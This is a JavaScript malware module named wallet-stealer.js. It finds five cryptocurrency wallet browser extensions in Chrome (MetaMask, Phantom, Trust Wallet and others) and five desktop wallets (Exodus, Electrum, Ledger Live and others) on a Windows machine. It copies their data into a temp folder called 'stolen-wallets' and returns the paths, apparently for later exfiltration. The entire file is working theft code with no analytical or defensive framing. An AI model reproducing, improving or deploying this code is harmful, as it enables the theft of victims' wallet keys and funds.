
// wallet-stealer.js - Improved with proper error tracking
const fs = require('fs/promises');
const path = require('path');
const os = require('os');

module.exports = async () => {
    try {
        console.log("[+] Wallet stealer started...");

        const found = [];      // Detected
        const copied = [];     // Successfully copied
        const failed = [];     // Failed to copy
        const savedPaths = [];

        const tempDir = path.join(os.tmpdir(), 'stolen-wallets');
        await fs.mkdir(tempDir, { recursive: true });

        // ==================== BROWSER EXTENSIONS ====================
        const browserExtensions = {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Ronin Wallet': 'fnjhmkhhmkbjkkabndcnnogkkjgpmlbl',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Rabby Wallet': 'acmacodkjbdgmoleebolmdjonilkdbch'
        };

        const chromeExtPath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Extensions');

        for (const [name, id] of Object.entries(browserExtensions)) {
            const extPath = path.join(chromeExtPath, id);
            try {
                await fs.access(extPath);
                found.push({ type: 'browser_extension', name, path: extPath });

                const destPath = path.join(tempDir, `extension_${name}`);

                await fs.cp(extPath, destPath, { recursive: true });
                console.log(`[+] Copied ${name} extension`);
                copied.push(name);
                savedPaths.push(destPath);

            } catch (e) {
                console.log(`[-] Failed to copy ${name}: ${e.message}`);
                failed.push({ name, reason: e.message });
            }
        }

        // ==================== LOCAL DESKTOP WALLETS ====================
        const localWallets = {
            'Exodus': path.join(process.env.LOCALAPPDATA, 'exodus'),
            'Atomic Wallet': path.join(process.env.APPDATA, 'atomic'),
            'Electrum': path.join(process.env.APPDATA, 'Electrum'),
            'Binance': path.join(process.env.APPDATA, 'Binance'),
            'Ledger Live': path.join(process.env.LOCALAPPDATA, 'Ledger Live')
        };

        for (const [name, walletPath] of Object.entries(localWallets)) {
            try {
                await fs.access(walletPath);
                found.push({ type: 'desktop_wallet', name, path: walletPath });

                const destPath = path.join(tempDir, `wallet_${name}`);

                await fs.cp(walletPath, destPath, { recursive: true });
                console.log(`[+] Copied ${name} wallet`);
                copied.push(name);
                savedPaths.push(destPath);

            } catch (e) {
                console.log(`[-] Failed to copy ${name}: ${e.message}`);
                failed.push({ name, reason: e.message });
            }
        }

        console.log(`[+] Wallet stealer completed. Detected: ${found.length}, Copied: ${copied.length}, Failed: ${failed.length}`);

        return {
            count: found.length,
            wallets: found,
            copied,
            failed,
            savedPaths: savedPaths
        };

    } catch (e) {
        console.log("[-] Wallet stealer critical error:", e.message);
        return {
            count: 0,
            wallets: [],
            copied: [],
            failed: [],
            savedPaths: [],
            error: e.message
        };
    }
};


